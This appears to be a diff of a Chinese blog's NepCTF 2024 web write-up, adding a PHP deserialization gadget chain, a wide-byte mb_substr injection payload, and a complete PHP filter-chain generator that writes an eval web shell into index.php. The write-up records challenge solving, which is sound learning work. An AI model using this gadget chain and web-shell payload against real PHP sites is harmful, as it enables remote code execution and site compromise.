@@ -247,6 +247,28 @@
         </span>
         
         
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%8F%90%E6%9D%83/" style="color: #03a9f4">提权</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/SSTI/" style="color: #00bcd4">SSTI</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00bcd4">反序列化</a>
+            </span>
+            
+        </span>
+        
         <!--文章字数统计-->
         
             
@@ -256,7 +278,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">3.9k字</span>
+        <span class="post-count">5.2k字</span>
       </span>
     </span>
 
@@ -265,7 +287,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">22分</span>
+        <span class="post-count">29分</span>
       </span>
     </span>
     
@@ -282,7 +304,8 @@
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>php master，除了php其它都不会（</p>
 <p>参考wp：</p>
-<p>晨曦✌：<a target="_blank" rel="noopener" href="https://chenxi9981.github.io/NepCTF_2024/">https://chenxi9981.github.io/NepCTF_2024/</a></p>
+<p><a target="_blank" rel="noopener" href="https://chenxi9981.github.io/NepCTF_2024/">https://chenxi9981.github.io/NepCTF_2024/</a></p>
+<p><a target="_blank" rel="noopener" href="https://natro92.fun/posts/64a8e859">https://natro92.fun/posts/64a8e859</a></p>
 <span id="more"></span>
 
 <hr>
@@ -584,6 +607,9 @@ template_env <span class="token operator">=</span> Environment<span class="token
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token string double-quoted-string">";s:3:"</span>str<span class="token string double-quoted-string">";O:1:"</span><span class="token constant">B</span><span class="token string double-quoted-string">":1:&#123;s:1:"</span>b<span class="token string double-quoted-string">";N;&#125;&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第二步，宽字节注入</p>
+<blockquote>
+<p>每发送一个<code>%f0abc</code>，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节<br>每发送一个<code>%f0%9fab</code>,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节<br>每发送一个<code>%f0%9f%9fa</code>,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</p>
+</blockquote>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">nep<span class="token operator">=</span>Nep<span class="token operator">&amp;</span>nep1<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第三步，到了<code>return ($this-&gt;b) ();</code>这里</p>
@@ -592,7 +618,112 @@ template_env <span class="token operator">=</span> Environment<span class="token
 
 <p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824163621405.png" alt="image-20240824163621405"></p>
 <p>flag在环境变量里，感觉是非预期了</p>
-<h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><hr>
+<h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">===</span> <span class="token string double-quoted-string">"\0key\0"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后是readflag函数，调用方式像这样</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'readflag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span>
+
+<span class="token comment">// O:1:"C":2:&#123;s:1:"s";s:1:"1";s:3:"str";O:1:"B":1:&#123;s:1:"b";a:2:&#123;i:0;O:1:"A":1:&#123;s:3:"key";N;&#125;i:1;s:8:"readflag";&#125;&#125;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>明显只能在 index.php 里面写马，那就是filterchain了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$base64_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4"</span><span class="token punctuation">;</span> <span class="token comment">/*&lt;?php @eval($_REQUEST['cmd']);?>*/</span>
+<span class="token variable">$conversions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string single-quoted-string">'/'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'0'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'2'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'3'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'4'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'5'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'6'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'7'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'8'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'9'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'A'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'B'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'C'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'D'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'E'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'F'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'G'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'H'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'I'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'J'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'K'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'L'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'M'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'N'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'O'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'P'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'Q'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'R'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'S'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'T'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'U'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'V'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'W'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'X'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'Y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'Z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'b'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'c'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'d'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'e'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'f'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'g'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'h'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'i'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'j'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'k'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'l'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'m'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'n'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'o'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'p'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'q'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'r'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'s'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'t'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'u'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'v'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'w'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937'</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$filters</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span>
+<span class="token comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+<span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">str_split</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$base64_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token variable">$conversions</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode|"</span><span class="token punctuation">;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$final_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filters</span><span class="token punctuation">&#125;</span></span>/resource=index.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$final_payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>于是传入写马</p>
+<hr>
 <h1 id="蹦蹦炸弹（boom-it）（复现）"><a href="#蹦蹦炸弹（boom-it）（复现）" class="headerlink" title="蹦蹦炸弹（boom_it）（复现）"></a>蹦蹦炸弹（boom_it）（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for
 <span class="token keyword">import</span> threading
 <span class="token keyword">import</span> random
@@ -1062,6 +1193,7 @@ ctfuser       <span class="token number">27</span>      <span class="token numbe
 
 <hr>
 <h1 id="Always-RCE-First（Unsolved）"><a href="#Always-RCE-First（Unsolved）" class="headerlink" title="Always RCE First（Unsolved）"></a>Always RCE First（Unsolved）</h1><p>参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/article/513">https://forum.butian.net/article/513</a></p>
+<p>有java不看（</p>
 <hr>
 <h1 id="NepRouter（Unsolved）"><a href="#NepRouter（Unsolved）" class="headerlink" title="NepRouter（Unsolved）"></a>NepRouter（Unsolved）</h1><p>有二进制不看（</p>
 
